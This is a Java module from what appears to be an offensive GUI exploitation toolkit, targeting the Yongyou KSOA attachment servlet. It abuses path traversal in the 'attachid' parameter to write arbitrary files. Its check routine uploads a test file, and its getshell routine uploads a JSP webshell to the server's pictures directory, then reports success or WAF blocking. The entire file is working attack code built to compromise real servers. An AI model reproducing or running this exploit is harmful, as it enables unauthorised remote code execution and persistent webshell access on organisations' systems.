package exp.oa.yongyou;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

import java.util.HashMap;


public class yongyou_KSOA_Attachmentupload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Disposition","application/x-msdownload; ");
        Response post = HttpTools.post(url + "/servlet/com.sksoft.bill.Attachment?action=read&&attachid=../../../../nishizhu.txt", shell.test_payload, head, "utf-8");
        Response response = HttpTools.get(url + "/pictures/nishizhu.txt", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            Platform.runLater(()->{
                textArea.appendText("\n 漏洞存在 测试文件写入成功\n" + url + "/nishizhu.txt");
            });
            return true;
        }else {
            Platform.runLater(()->{
                textArea.appendText("\n yongyou_KSOA_Attachmentupload-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=---------------------------122739796041499160471980406311");
        Response post = HttpTools.post(url + "/servlet/com.sksoft.bill.Attachment?action=read&&attachid=../../../../nishizhu.jsp", shell.readFile(shell.Jsppath), head, "utf-8");
        Response response = HttpTools.get(url + "/pictures/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            Platform.runLater(()->{
                textArea.appendText("\n 漏洞存在 webshell文件写入成功\n" + url + "/nishizhu.jsp");
            });
            return true;
        }else {
            Platform.runLater(()->{
                textArea.appendText("\n waf拦截！！！请手动复现！！！");
            });
            return false;
        }
    }

}
